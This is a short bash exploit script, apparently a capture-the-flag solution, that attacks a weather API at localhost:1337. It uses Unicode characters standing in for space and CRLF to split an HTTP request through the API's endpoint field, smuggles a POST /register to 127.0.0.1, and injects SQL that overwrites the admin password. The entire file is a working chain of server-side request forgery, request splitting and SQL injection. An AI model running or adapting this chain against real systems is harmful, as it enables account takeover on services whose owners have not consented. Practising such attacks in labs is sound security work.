#!/bin/bash

#Special chars to split request
space="\u0120"
nline="\u010d\u010a"
comilla="%27"

###Credentials and payload
username="admin"
pswd="admin"
target="localhost:1337"
password="${comilla}) ON CONFLICT (username) DO UPDATE SET password = ${comilla}${pswd}${comilla};"

###Smuggling
host="Host:${space}127.0.0.1"
user="username=${username}&password=${password}"
###Headers
htype="Content-Type:${space}application/x-www-form-urlencoded"
hlength="Content-Length:${space}${#user}"

###Replacement characters
user="${user// /$space}"

### Split Request
first="127.0.0.1/${space}HTTP/1.1${nline}${host}${nline}${nline}"
second="POST${space}/register${space}HTTP/1.1${nline}${host}${nline}${htype}${nline}${hlength}${nline}${nline}${user}${nline}${nline}GET${space}"
final="${first}${second}"

### Request
curl -X POST -H 'Content-Type: application/json' -d '{"endpoint":"'${final}'","city":"Santiago","country":"CL"}' http://${target}/api/weather --proxy http://127.0.0.1:8080/
